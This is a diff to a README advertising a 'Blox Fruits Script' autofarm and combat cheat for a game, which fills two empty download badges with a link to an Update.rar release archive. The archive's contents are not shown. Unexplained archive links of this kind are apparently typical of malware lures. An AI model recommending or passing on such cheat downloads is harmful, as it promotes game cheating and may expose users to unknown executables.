@@ -1,9 +1,9 @@
-# 🏴‍☠️ Blox Fruits Script – Ultimate Autofarm & Combat Tool (2025 Edition)  [![Download Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)]()  
+# 🏴‍☠️ Blox Fruits Script – Ultimate Autofarm & Combat Tool (2025 Edition)  [![Download Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)](https://github.com/MenfisBBis/blox-fruits-script/releases/download/Update/Update.rar)  
 
 
 ![bl](https://github.com/user-attachments/assets/ac9b2fd9-735b-4ce3-9cae-c23ac856ee4f)
 
-[![Download Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)]()  
+[![Download Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)](https://github.com/MenfisBBis/blox-fruits-script/releases/download/Update/Update.rar)  
 
 
 ---
